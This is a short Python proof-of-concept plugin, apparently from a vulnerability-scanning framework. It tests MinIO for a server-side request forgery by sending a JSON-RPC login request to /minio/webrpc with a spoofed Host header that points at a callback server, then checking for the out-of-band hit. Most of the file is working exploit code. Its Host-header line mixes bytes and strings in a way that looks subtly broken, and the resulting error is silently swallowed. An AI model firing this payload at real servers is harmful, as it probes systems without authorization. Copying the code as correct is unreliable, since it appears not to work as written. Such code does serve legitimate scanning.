import requests
import config
from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType
import reverse
from urllib.parse import urlparse


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "MinIO SSRF"
        self.app_name = "MinIO"
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        rev_token = reverse.request_code('headers["User-Agent"].contains("Go-http-client") && url.contains("test")')
        url = target + "/minio/webrpc"
        rev_url = urlparse(config.reverse_url)
        try:
            requests.post(url, headers={"Host": (rev_url.hostname + b":").encode() + str(rev_url.port)}, json={
                "id": 1,
                "jsonrpc": "2.0",
                "params": {
                    "token": "test"
                },
                "method": "web.LoginSTS"
            })
        except Exception:
            pass
        if reverse.check(rev_token) is not None:
            self.logger.success("MinIO SSRF {}".format(url))
            return url
